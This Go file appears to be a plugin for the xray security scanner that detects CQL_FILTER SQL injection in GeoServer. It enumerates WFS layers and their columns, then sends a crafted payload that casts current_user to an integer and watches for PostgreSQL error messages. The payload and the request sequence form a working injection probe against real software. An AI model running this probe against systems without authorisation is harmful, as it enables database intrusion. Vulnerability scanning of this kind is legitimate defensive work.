package plugin

import (
	"bytes"
	"encoding/json"
	"github.com/chaitin/xray/event"
	"github.com/chaitin/xray/plugin/module/xhttp"
	"github.com/chaitin/xray/util"
	"github.com/chaitin/xray/xray"
	"net/url"
	"regexp"
	"strconv"
)

var _ = xray.NewPlugin("poc-go-geoserver-cql-filter-sqli", func(p *xray.Plugin, client *xhttp.Client) {
	p.Event(func(website *event.Website) *event.Vulnerability {
		req, _, err := xhttp.LoadFromEvent(website.HttpFlow)
		p.Check(err)

		var context = ""
		var capabilitiesResp []byte
		var steps []*event.Proof_Step
		var reqCount int
		reqN := func() string {
			reqCount++
			return "r" + strconv.Itoa(reqCount)
		}

		// 确认 context
		r0 := req.Clone()
		p.Check(r0.ReplaceURI("/ows?service=WFS&version=1.0.0&request=GetCapabilities"))
		res0, err := client.Do(r0)
		p.Check(err)
		steps = append(steps, toSteps(reqN(), r0, res0))
		if res0.GetStatusCode() != 200 || res0.GetHeader().Get("Content-Type") != "application/xml" {
			r1 := req.Clone()
			p.Check(r1.ReplaceURI("/geoserver/ows?service=WFS&version=1.0.0&request=GetCapabilities"))
			res1, err := client.Do(r1)
			p.Check(err)
			steps = append(steps, toSteps(reqN(), r1, res1))
			if res1.GetStatusCode() != 200 || res1.GetHeader().Get("Content-Type") != "application/xml" {
				return nil
			} else {
				capabilitiesResp = res1.GetBody()
				context = "/geoserver"
			}
		} else {
			capabilitiesResp = res0.GetBody()
		}

		// 获取所有 workspace
		var workspaces []string
		var blacklist = []string{"ne:boundary_lines", "ne:coastlines", "ne:countries", "tiger:poly_landmarks", "tiger:poi",
			"tiger:tiger_roads", "ne:populated_places", "sf:archsites", "sf:bugsites", "sf:restricted", "sf:roads",
			"sf:streams", "topp:tasmania_cities", "topp:tasmania_roads", "topp:tasmania_state_boundaries",
			"topp:tasmania_water_bodies", "topp:states", "tiger:giant_polygon"}
		pattern, err := regexp.Compile(`<FeatureType><Name>(.*?)</Name>`)
		p.Check(err)
		for _, match := range pattern.FindAllStringSubmatch(string(capabilitiesResp), -1) {
			if util.StringIIn(match[1], blacklist) {
				continue
			}
			workspaces = append(workspaces, url.QueryEscape(match[1]))
		}

		var workspaceToColumns = make(map[string][]string)
		for _, workspace := range workspaces {
			r2 := req.Clone()
			p.Check(r2.ReplaceURI(context + "/wfs?request=DescribeFeatureType&version=2.0.0&service=WFS&outputFormat=application/json&typeName=" + workspace))
			res2, err := client.Do(r2)
			p.Check(err)
			steps = append(steps, toSteps(reqN(), r2, res2))
			var data map[string]interface{}
			if err := json.NewDecoder(bytes.NewReader(res2.GetBody())).Decode(&data); err != nil {
				continue
			}
			var columns []string

			featureTypes := data["featureTypes"].([]interface{})
			for _, featureType := range featureTypes {
				for _, property := range featureType.(map[string]interface{})["properties"].([]interface{}) {
					columns = append(columns, property.(map[string]interface{})["name"].(string))
				}
			}
			workspaceToColumns[workspace] = columns
		}

		for workspace, columns := range workspaceToColumns {
			for _, column := range columns {
				r3 := req.Clone()
				p.Check(r3.ReplaceURI(context + "/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=" + workspace + "&CQL_FILTER=strStartsWith(" + column + ",'x'')+%3d+true+and+1%3d(SELECT+CAST+((SELECT+current_user)+AS+INTEGER))+--+')+%3d+true"))
				res3, err := client.Do(r3)
				p.Check(err)
				steps = append(steps, toSteps(reqN(), r3, res3))
				if bytes.Contains(res3.GetBody(), []byte("invalid input syntax for type integer")) || bytes.Contains(res3.GetBody(), []byte("PSQLException")) {
					v := p.NewWebVulnerability(website, steps...)
					v.Links = append(v.Links, "https://stack.chaitin.com/techblog/detail?id=107")
					return v
				}
			}
		}
		return nil

	})
})

func toSteps(description string, req *xhttp.Request, resp *xhttp.Response) *event.Proof_Step {
	request, _ := req.ToEvent()
	response, _ := resp.ToEvent()
	step := &event.Proof_Step{
		Traffic: &event.Proof_Step_HttpFlow{
			HttpFlow: &event.HttpFlow{Exchanges: []*event.HttpExchange{
				{
					Request:  request,
					Response: response,
				},
			}},
		},
		Description: description,
	}
	return step
}
